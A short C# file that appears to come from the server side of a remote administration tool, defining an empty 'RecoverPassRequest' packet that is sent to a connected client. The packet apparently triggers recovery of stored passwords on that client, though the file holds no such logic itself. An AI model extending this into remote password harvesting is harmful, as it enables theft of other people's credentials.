using ProtoBuf;
using System;

namespace xServer.Core.Packets.ServerPackets
{
    [ProtoContract]
    public class RecoverPassRequest : IPacket
    {
        public RecoverPassRequest()
        {
        }
        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}
